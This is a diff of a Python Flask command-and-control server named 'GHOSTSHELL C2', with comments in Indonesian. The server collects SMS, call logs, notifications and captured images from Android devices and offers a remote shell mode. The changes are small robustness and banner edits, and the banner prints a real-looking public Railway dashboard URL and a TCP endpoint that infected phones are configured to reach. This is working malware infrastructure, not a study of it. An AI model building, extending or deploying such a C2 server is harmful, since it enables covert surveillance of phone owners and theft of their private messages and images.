@@ -17,8 +17,8 @@ from flask_socketio import SocketIO, emit
 import io
 
 # --- Railway Configuration ---
-HTTP_PORT = int(os.environ.get('PORT', 8080))  # Railway HTTP port
-TCP_PORT = 9090  # Internal port untuk Android TCP
+HTTP_PORT = int(os.environ.get('PORT', 8080))  # Railway HTTP port (dari environment)
+TCP_PORT = 9090  # Port untuk Android TCP connection (INTERNAL)
 HOST = '0.0.0.0'
 
 # --- Globals ---
@@ -303,7 +303,7 @@ def api_status():
         'notifications': len(notification_history),
         'sms': len(sms_history),
         'calls': len(call_history),
-        'images': len([f for f in os.listdir('captured_images') if f.endswith('.jpg')]),
+        'images': len([f for f in os.listdir('captured_images') if f.endswith('.jpg')]) if os.path.exists('captured_images') else 0,
         'uptime': int(time.time() - start_time),
         'in_shell_mode': in_shell_mode,
         'in_notification_mode': in_notification_mode,
@@ -425,12 +425,15 @@ if __name__ == '__main__':
     print("-" * 60)
     print("      GHOSTSHELL C2 - RAILWAY EDITION")
     print("-" * 60)
-    print(f"[*] HTTP Server : http://{HOST}:{HTTP_PORT}")
-    print(f"[*] HTTP Public : web-production-aa67.up.railway.app")
-    print(f"[*] TCP Server  : {HOST}:{TCP_PORT}")
-    print(f"[*] TCP Public  : mainline.proxy.rlwy.net:37745")
+    print(f"[*] HTTP Server (Web Dashboard):")
+    print(f"    - Internal : http://{HOST}:{HTTP_PORT}")
+    print(f"    - Public   : https://web-production-aa67.up.railway.app")
     print("-" * 60)
-    print("[*] Android Config:")
+    print(f"[*] TCP Server (Android Connection):")
+    print(f"    - Internal : {HOST}:{TCP_PORT}")
+    print(f"    - Public   : mainline.proxy.rlwy.net:37745")
+    print("-" * 60)
+    print("[*] Android Config HARUS:")
     print(f"    SERVER_IP = \"mainline.proxy.rlwy.net\"")
     print(f"    SERVER_PORT = 37745")
     print("-" * 60)
